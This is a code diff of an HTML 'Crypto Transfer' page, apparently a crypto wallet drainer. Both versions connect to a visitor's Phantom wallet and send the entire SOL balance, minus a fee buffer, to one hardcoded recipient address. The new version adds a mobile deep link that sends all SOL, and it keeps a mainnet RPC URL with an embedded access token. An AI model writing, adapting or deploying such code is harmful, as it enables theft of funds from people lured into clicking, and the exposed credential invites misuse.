@@ -4,54 +4,64 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Crypto Transfer</title>
-    <script type="module">
-        import { Connection, PublicKey, Transaction, SystemProgram } from 'https://cdn.jsdelivr.net/npm/@solana/web3.js/+esm';
-        
-        window.Buffer = window.buffer?.Buffer || window.Buffer;
+</head>
+<body>
+    <h2>Click below to transfer all SOL to the recipient wallet</h2>
+    <button id="transferButton">Transfer Now</button>
 
-        const recipientWallet = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";
-        const connection = new Connection("https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df");
-
-        async function transferFunds() {
-            if (!window.phantom || !window.phantom.solana) {
-                alert("Phantom wallet is not detected. Please install it and try again.");
-                return;
+    <script>
+        document.getElementById('transferButton').addEventListener('click', async () => {
+            const receiverWallet = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";
+            
+            function isMobileDevice() {
+                return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
             }
-            try {
-                const provider = window.phantom.solana;
-                await provider.connect();
-                const senderPublicKey = new PublicKey(provider.publicKey);
 
-                const balance = await connection.getBalance(senderPublicKey);
-                if (balance <= 0) {
-                    alert("Insufficient SOL balance to proceed with the transfer.");
+            if (isMobileDevice()) {
+                // Mobile deep link for Phantom wallet to send all SOL
+                const mobileLink = `https://phantom.app/ul/v1/send?recipient=${receiverWallet}&asset=sol&amount=ALL`;
+                window.location.href = mobileLink;
+            } else {
+                if (!window.solana) {
+                    alert("Phantom wallet not found. Please install it.");
                     return;
                 }
 
-                const transaction = new Transaction().add(
-                    SystemProgram.transfer({
-                        fromPubkey: senderPublicKey,
-                        toPubkey: new PublicKey(recipientWallet),
-                        lamports: balance - 5000, // Keep small buffer for fees
-                    })
-                );
+                try {
+                    await window.solana.connect();
+                    const provider = window.solana;
+                    const connection = new solanaWeb3.Connection("https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df", 'confirmed');
 
-                transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-                transaction.feePayer = senderPublicKey;
+                    const publicKey = provider.publicKey;
+                    alert("Connected wallet: " + publicKey.toBase58());
 
-                const signedTransaction = await provider.signTransaction(transaction);
-                const signature = await connection.sendRawTransaction(signedTransaction.serialize());
+                    const balance = await connection.getBalance(publicKey);
+                    if (balance <= 5000) {
+                        alert("Insufficient balance to proceed.");
+                        return;
+                    }
 
-                alert(`Transaction sent: https://explorer.solana.com/tx/${signature}?cluster=mainnet-beta`);
-            } catch (error) {
-                alert(`Error: ${error.message}`);
-                console.error("Transaction failed:", error);
+                    const transaction = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: publicKey,
+                            toPubkey: new solanaWeb3.PublicKey(receiverWallet),
+                            lamports: balance - 5000, // Leaving a small amount for transaction fees
+                        })
+                    );
+
+                    const { signature } = await provider.signAndSendTransaction(transaction);
+                    alert("Transaction sent! Signature: " + signature);
+                    await connection.confirmTransaction(signature);
+                    alert("Transaction confirmed!");
+
+                } catch (error) {
+                    console.error("Error:", error);
+                    alert("Error: " + error.message);
+                }
             }
-        }
+        });
     </script>
-</head>
-<body>
-    <h2>Click below to transfer all funds</h2>
-    <button onclick="transferFunds()">Transfer Now</button>
+
+    <script src="https://unpkg.com/@solana/web3.js@1.75.0/lib/index.iife.min.js"></script>
 </body>
 </html>
